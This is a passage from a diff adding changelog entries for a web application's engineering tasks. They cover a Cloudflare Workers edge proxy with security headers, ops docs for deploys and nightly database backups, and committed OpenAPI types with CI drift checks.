+- **T150** — Cloudflare Workers static assets + /api edge proxy Worker + _headers. `frontend/wrangler.jsonc` (worker `servicepro-web`, SPA fallback, `run_worker_first` for `/api/*` + `/version`, custom domain servicepro.sharkfins.xyz, workers.dev/previews off, `EDGE_PROXY_SECRET` required), `frontend/worker/{index,proxy}.ts` (503 when `API_ORIGIN` unset, raw body streamed, `X-SP-Client-IP`/`X-SP-Edge-Secret` set and spoofed copies stripped) with 22 tests, `public/_headers` (CSP/HSTS/cache) + `.assetsignore`; same-origin `/api` default; verified with `wrangler deploy --dry-run` and `wrangler dev`. Not deployed (T204).
+- **T151** — Ops docs: Cloud Run setup, deploy/rollback, backups + nightly pg_dump → R2 workflow. `docs/ops/cloud-run-setup.md`, `docs/ops/deploy.md` (rollback incl. Workers versions), `docs/ops/backups.md`; `.github/workflows/db-backup.yml` nightly pg_dump → R2 `servicepro-backups`, skipped until the `MIGRATION_DATABASE_URL` secret exists (activation + restore drill: T209).
+- **T152** — Commit generated OpenAPI and TS types for drift gating. `backend/docs/{swagger.json,swagger.yaml,docs.go}` and `frontend/src/types/api.generated.ts` committed; swag pinned via go.mod `tool` directive (`go tool swag`); `make openapi-check`, pre-commit hook and CI `openapi-drift` gate on them.
